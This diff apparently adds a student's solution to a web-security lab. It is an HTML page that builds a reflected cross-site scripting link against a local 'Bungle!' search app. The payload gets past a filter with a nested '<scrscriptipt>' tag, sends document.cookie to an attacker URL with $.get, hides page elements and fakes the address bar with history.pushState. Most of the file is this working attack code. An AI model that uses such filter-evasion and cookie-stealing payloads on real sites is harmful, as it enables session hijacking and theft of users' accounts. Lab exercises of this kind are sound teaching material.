@@ -1,0 +1,51 @@
+<html>
+
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script>
+        // Extend this function:
+        function payload(attacker) {
+            function proxy(href) {
+                $("html").load(href, function () {
+                    // add XSS code here
+                    $.get(attacker, document.cookie);
+                    alert(document.cookie);
+                    $("html").show();
+                    $("#history-list").hide() //add stuff after #, look at inspect element to see what you need to hide 
+                    $("#query-lbl").hide()
+                });
+            }
+
+            history.pushState(null,"", ["search"]); //add stuff between ()
+            $("html").hide();
+            proxy("./http://localhost/project2/search"); //add stuff after "./", think about what page we want to load 
+        }
+
+        function makeLink(xssdefense, target, attacker) {
+            if (xssdefense == 2) {
+                return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<scrscriptipt" + ">" + payload.toString() +
+                    ";payload(\"" + attacker + "\");</scrscriptipt" + ">");
+    } else {
+
+    }
+}
+
+var xssdefense = 2;
+var target = "http://localhost/project2/"; 
+var attacker = "http://localhost:31337/";
+
+$(function() {
+    var url = makeLink(xssdefense, target, attacker);
+    $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+    }
+);
+</script>
+</head>
+
+<body class="vsc-initialized">
+    <h3></h3>
+</body>
+
+</html>
